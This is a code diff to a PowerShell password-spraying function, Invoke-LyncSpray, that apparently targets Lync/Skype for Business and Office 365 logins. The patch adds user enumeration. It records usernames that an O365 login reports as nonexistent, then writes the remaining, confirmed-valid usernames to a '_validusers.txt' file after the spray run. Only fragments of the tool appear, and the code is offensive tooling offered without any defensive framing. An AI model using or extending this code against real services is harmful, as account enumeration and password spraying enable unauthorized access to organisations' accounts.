@@ -120,6 +120,7 @@ function Invoke-LyncSpray
 
   $Usernames = Get-Content $UserList
   $Username = $Usernames[0]
+  $InvalidUsernames = [System.Collections.ArrayList]@()
   if (-Not $AutoDiscoverURL)
   {
     Write-host "[*] No AutoDiscoverURL provided, attempting to discover"
@@ -187,6 +188,14 @@ function Invoke-LyncSpray
     {
         Start-Sleep -Milliseconds $Delay
     }
+  }
+  if($Office365 -And ($InvalidUsernames.Count -gt 0))
+  {
+    $OutputDir = Split-Path $UserList
+    $OutputFile = [System.IO.Path]::GetFileNameWithoutExtension($UserList)
+    $OutputFullPath = "${OutputDir}\${OutputFile}_validusers.txt"
+    Write-Host -Foreground Yellow "[*] Saving valid usernames to $OutputFullPath."
+    $ValidUsernames = $Usernames | Where {$InvalidUsernames -NotContains $_} > $OutputFullPath
   }
 }
 
@@ -512,6 +521,7 @@ function Invoke-AuthenticateO365
     else
     {
       Write-Verbose "[*] Authentication failed: $($Username):$($Password). Username does not exist."
+      $InvalidUsernames.Add($Username) | Out-Null
     }
 
   } catch {
